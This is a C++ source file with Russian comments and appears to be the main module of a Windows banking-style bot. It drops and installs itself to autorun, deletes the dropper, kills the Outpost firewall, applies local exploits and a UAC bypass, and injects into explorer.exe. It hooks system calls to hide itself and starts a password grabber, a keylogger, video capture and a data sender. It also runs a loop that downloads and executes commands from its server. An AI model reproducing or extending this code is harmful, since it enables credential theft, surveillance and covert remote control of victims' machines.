#include <windows.h>

#include "BotCore.h"
#include "DllLoader.h"

#include "Utils.h"
#include "Exploit.h"
#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"
#include "Loader.h"
#include "Config.h"
#include "Crypt.h"
#include "FtpSniffer.h"
#include "ntdll.h"
#include "BotEvents.h"
#include "Task.h"
#include "md5.h"
#include "BotDef.h"
#include "DbgRpt.h"
#include "Modules.h"
#include "Main.h"
#include "StrConsts.h"
#include "Installer.h"



#include "BotDebug.h"

//********************** Отладочные шаблоны **********************************

namespace MAINDBGTEMPLATES
{
	#include "DbgTemplates.h"
}

// Объявляем шаблон вывода отладочных строк
#define MDBG MAINDBGTEMPLATES::DBGOutMessage<>


//***************************************************************************




/*char* LogName = "c:\\BotLog.log";

void WriteLog(const char* Msg)
{
	HANDLE H = (HANDLE)pCreateFileA(LogName, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, 0,NULL);
	pSetFilePointer(H, 0, 0, FILE_END);
	DWORD W;
	string L;
	L.Format("[%d] %s \r\n", (DWORD)pGetTickCount() / 1000, Msg);
	pWriteFile(H, L.t_str(), L.Length(), &W, NULL);

//	pWriteFile(H, Msg, strlen(Msg), &W, NULL);
//	pWriteFile(H, "\r\n", 2, &W, NULL);
	pCloseHandle(H);
}
*/






#pragma comment(linker, "/ENTRY:MyMain" )
//#pragma comment(linker, "/ENTRY:ExplorerMain" )


char DropperFileName[MAX_PATH]; // Имя запускаемого файла

//WCHAR TempFileName[ MAX_PATH ]; //темп файл для добавления в автозагрузку
//WCHAR FileToDelete[ MAX_PATH ]; //путь для удаления первоначального файла бота

DWORD DropperPid     = 0; // пид процесса бота
BOOL IsDropper       = 0; // Признак того, что был совершён запуск из дропера
BOOL FirstRun	     = 0; //Признак того что бот запускается первы раз
DWORD dwAlreadyRun   = 0; //если уже запущены
DWORD dwGrabberRun	 = 0; //отработал ли граббер
BOOL InjectedInSelfExplorer = 0; //Признак того, что ботом был создан свой экземпляр эксплорера куда он и заинжектился
//DWORD dwExplorerPid  = 0; //пид эксплорера



void InternalAddToAutorun()
{
	// Добавляем программу в автозагрузку
	// только в случае если в системе не зарегистрирован мьютекс
	// сигнализирующий об успешной установке буткита
	#ifdef DEBUGBOT
		return;
	#endif
	
	const static char ButkitMutex[] = {'b', 'k', 't', 'r', 'u', 'e',  0};
	HANDLE Mutex = (HANDLE)pOpenMutexA(SYNCHRONIZE, TRUE, (PCHAR)ButkitMutex);
	if (Mutex)
	{
		pCloseHandle(Mutex);
		MDBG("Main", "Буткит установлен. Игнорируем добавление в автозагрузку.");
		return;
	}

	bool ServiceInstalled = false;
	//if (!WSTR::IsEmpty(TempFileName))
	if (IsDropper)
	{
			Install(DropperFileName, FALSE,  TRUE, DropperPid);
	}
}


void DeleteDropper() // убиваем процесс, стираем файл
{
	
	if (IsDropper)
	{
		MDBG("Main", "Удаляем дропер");
		pWinStationTerminateProcess(NULL, DropperPid, DBG_TERMINATE_PROCESS );	
		pSetFileAttributesA( DropperFileName, FILE_ATTRIBUTE_ARCHIVE );
		pDeleteFileA(DropperFileName);
	}
}



BOOL RunLoaderRoutine()
{
#ifdef UAC_bypassH
//	if( !RunBotBypassUAC(0) )
		return MegaJump( LoaderRoutine ) == TRUE;
//	return true;
#else
	return MegaJump( LoaderRoutine );
#endif
}

BOOL RunVideoProcess()
{
	#ifdef VideoRecorderH
		MDBG( "Main", "Запуск видеодлл в отдельном свцхосте" );
		return MegaJump( VideoProcess::StartSvchost );
	#else
		return FALSE;
	#endif
}

DWORD WINAPI LoaderRoutine( LPVOID lpData )
{
	BOT::Initialize();
	
	MDBG("Main", "*************** LoaderRoutine (PID:%d)", GetUniquePID());

	//UnhookDlls();

	BOT::Protect(NULL);

	// Отключаем отображение ошибок при крахе процесса
	DisableShowFatalErrorDialog();

	// Инициализируем систему отправки статистической информации
	DebugReportInit();

	// Вызываем событие
	bool Cancel = false;
	SVChostStart(NULL, Cancel);
	if (Cancel)
	{
		// Убиваем процесс svchost
		pExitProcess(1);
	}

	// Запускаем автообновление
	#ifdef BotAutoUpdateH
		StartAutoUpdate();
	#endif

	// Стартуем поток отправки данных

	DataGrabber::StartDataSender();

	// Стартуем поток обновления списка процессов кейлогера
	#ifdef UniversalKeyLoggerH
		KeyLogger::StartProcessListDownloader();
	#endif


	bool FirstSended = false;

	#ifdef VideoRecorderH
		#ifndef VideoProcessSvchost
			if( VideoProcess::Start() )
				MDBG( "Main", "Запустили видео процесс" );
			else
				MDBG( "Main", "ERROR: не запустился видео процесс" ); 
		#endif //VideoProcessSvchost
	#endif

	if (InitializeTaskManager(NULL, true))
	{
		MDBG("Main", "=====>> Стартуем выполнение команд");

		while (true)
		{

			DownloadAndExecuteCommand(NULL, NULL);

			// "Гениальность" проектирования взаимосвязи бота и его сервера
			// отправка стартовой информации должна идти только после получения
			// команды
			if (!FirstSended)
			{
				MDBG("Main", "=====>> Отправляем информацию о системе");
				FirstSended = SendFirstInfo();
			}

			// Приостанавливаем выполнение команд
			if (!TaskManagerSleep(NULL))
				break;
		}

    }
	pExitProcess(0);
	return 0;
}

void ExplorerMain()
{
	BOT::Initialize();

	MDBG("Main", "----------------- ExplorerMain -----------------");
	MDBG("Main", "Appliation (PID:%d) %s", Bot->PID(), Bot->ApplicationName().t_str());
	MDBG("Main", "WorkPath %s", BOT::GetWorkPath());

	// Создаем мьютекс запущенного бота для сигнализации другим 
	// способам автозапуска.
	BOT::TryCreateBotInstance();

	if (!InjectedInSelfExplorer)
		UnhookDlls();

	// Отключаем отображение ошибок при крахе процесса
	//DisableShowFatalErrorDialog();

	InternalAddToAutorun();

	DeleteDropper();


	//----------------------------------------------------

	if ( !dwAlreadyRun )
	{
		RunLoaderRoutine();
		//MegaJump( LoaderRoutine );
		//RunBotBypassUAC(0);
	}
	#ifdef VideoProcessSvchost
		RunVideoProcess();
	#endif

	#ifdef GrabberH
		if (FirstRun && !dwGrabberRun )
			MegaJump( GrabberThread ); 
	#endif

	//MegaJump(AvFuckThread);
	
	// 
	HookZwResumeThread();
	HookZwQueryDirectoryFile();


	// Вызываем событие cтарта експлорера

	if (FirstRun)
		ExplorerFirstStart(NULL);

	ExplorerStart(NULL);
	// Входим в бесконечный цикл работы 
	while (1) pSleep(INFINITE);
}


DWORD WINAPI ExplorerRoutine( LPVOID lpData )
{

	BOT::InitializeApi();

	MDBG( "Main", "ExplorerRoutine InjectedInSelfExplorer=%d",  InjectedInSelfExplorer);
	
	if (InjectedInSelfExplorer) 
	{
		//если инжект был в свой эксплорер завершаемся	
		InjectedInSelfExplorer = FALSE;
		if (!InjectIntoExplorer(ExplorerRoutine))
		{
			ExplorerMain();
		}

		pExitProcess(1);
	}
	ExplorerMain();
	return 0;
}

/*
DWORD WINAPI RunFromDll(void*)
{
	BOT::Initialize();
	DWORD pid = GetUniquePID();
	MDBG( "DllBot", "Запустили из dll pid=%d", pid );
	pWinExec( "regedit.exe", SW_SHOW );
	int err = pGetLastError();
	while(1)
	{
		Sleep(5000);
		MDBG( "DllBot", "work %d,%d", pid, err );
	}
	return 0;
}
*/

int APIENTRY MyMain() 
{
	BOT::Initialize();   
#ifdef UAC_bypassH
	DWORD image = (DWORD)GetImageBase();
    PIMAGE_NT_HEADERS headers = (PIMAGE_NT_HEADERS)
        ((PUCHAR)image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
	if( headers->FileHeader.Characteristics & IMAGE_FILE_DLL )
	{
		//exe бота запущен как dll, такое может быть при обходе различных защит
		MDBG( "Main", "Запустили как DLL после обхода UAC" );
		if( ExecTaskAfterUAC() )
			return 0;
	}
#endif //UAC_bypassH

	MDBG("Main", "Запускается бот. Версия бота %s\r\nEXE: %s", BOT_VERSION, Bot->ApplicationName().t_str());
	
#ifdef INSTALL_BOT_AS_SERVICE
	// Проверяем сервис запущен или нет
	if (BOT::IsService())
	{
		MDBG("Main", "Стартует сервис");
		MDBG("Main", "Рабочий каталог %s", BOT::GetBotPath().t_str());
		// Если бот ещё не  запущен, то выполняем инжект в эксплорер
		BOT::SetBotType(BotService);

		if (!BOT::IsRunning())
		{
			//JmpToExplorer(ExplorerRoutine);
			MDBG("Main", "Сервис инжектится в Explorer");
			dwExplorerSelf = 1;
			JmpToExplorer(ExplorerRoutine);
		}

		BOT::ExecuteService();
		pExitProcess(0);
		return 0;
	}
#endif

	MDBG("Main", "Запускается Ring3 версия бота");
	// Запускается ринг3 версия
	BOT::SetBotType(BotRing3);

	// Проверяем не запущен ли на данном компьютере другой экземпляр бота
	if (BOT::IsRunning())
	{
		pExitProcess(0);
		return 0;
	}

	MDBG("Main", "Запускается бот. Версия бота %s", BOT_VERSION);


	//UnhookDlls(); //снимаем хуки

	pGetModuleFileNameA(NULL, DropperFileName, MAX_PATH);
	DropperPid = (DWORD)pGetCurrentProcessId();

	DWORD dwProcessHash = File::GetNameHashA(DropperFileName, false);
	DWORD dwProcessHash2 = File::GetNameHashA(DropperFileName, true);
	
	
	// Проверяем источник запуска (дроппер либо бот из автозагрузки)
	IsDropper = dwProcessHash != BOT::GetBotExeNameHash();

	// Если запуск идёт из дропера то считаем, что это первый запуск
	FirstRun = IsDropper;

	// Проверяем запущены ли мы в процессе проводника
	bool InExplorer = dwProcessHash2 == 0x490A0972 /* explorer.exe */; 

	// Убиваем оутпост
	KillOutpost();

	// Устанавливаем эксплоиты
	BOOL Exploits = SetExploits();

	if (!Exploits)
	{
		// Если не удалосьустановить эксплоиты то запускаем процесс лоадера вне эксплорер
		// и, в случае первого  запуска, запускаем грабер паролей

		if ( RunLoaderRoutine() /*MegaJump( LoaderRoutine )*/ )
			dwAlreadyRun = 1;

		#ifdef GrabberH
			if (FirstRun)
				dwGrabberRun = MegaJump(GrabberThread);
		#endif 
	}


	if (InExplorer)
	{
		MDBG( "Main", "Стартанули в процессе explorer.exe");
		IsDropper = FALSE;
		InjectedInSelfExplorer = FALSE;
		RunThread( ExplorerRoutine, 0 );
	}
	else
	{
		// Обычный запуск exe бота
		MDBG( "Main", "В процессе [IsDropper=%d] %s, %08x", IsDropper, DropperFileName, dwProcessHash2 );
		InjectedInSelfExplorer = TRUE;
	    // Запускаем свой эксплорер и инжектимся в него
		if (!JmpToExplorer(ExplorerRoutine))
		{
			MDBG( "Main", "Ошиька создания эксплорера и инжекта в него");
			InjectedInSelfExplorer = FALSE;
			
			if (IsDropper)
				InternalAddToAutorun();

			// Пытаемся заинжектиться в запущенный эксплорер
			if (!InjectIntoExplorer( ExplorerRoutine ) && !dwAlreadyRun )
			{
				RunLoaderRoutine(); //MegaJump( LoaderRoutine );
			}
		}
	}

/*
	m_wcsncpy(FileToDelete, ModulePath, m_wcslen( ModulePath ) );
	dwKillPid = (DWORD)pGetCurrentProcessId();
	CopyFileToTemp( ModulePath, TempFileName );

	if (!IsDropper) 
	{
		// запуск из бота в автозагрузке

		if ( !JmpToExplorer( ExplorerRoutine ) )
		{
			InjectedInSelfExplorer = FALSE;

		}		
	}
	else
	{
		// Бот запускается из дропера

		InjectedInSelfExplorer = TRUE;

		if(InExplorer)
		{
		}
		else
		{

			if (!JmpToExplorer(ExplorerRoutine ) )
			{
				InjectedInSelfExplorer = 0;
	
			}
		}
	}
*/

	if(!InExplorer) 
		pExitProcess(1);
	return 1;
}